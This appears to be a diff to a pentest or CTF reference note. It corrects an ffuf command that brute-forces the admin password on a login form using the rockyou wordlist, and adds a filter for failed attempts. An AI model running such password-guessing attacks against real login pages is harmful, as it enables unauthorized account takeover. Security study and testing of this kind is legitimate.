@@ -8,9 +8,10 @@
 
 ```sh
 ffuf \
-  -u https://website.com/login
-  -H "Content-Type: application/x-www-form-urlencoded"
-  -X POST -d "username=admin&password=FUZZ"
-  -w /usr/share/wordlists/rockyou.txt:FUZZ 
+  -u https://website.com/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -X POST -d "username=admin&password=FUZZ" \
+  -w /usr/share/wordlists/rockyou.txt:FUZZ  \
+  -fr "Incorrect"
 ```
   
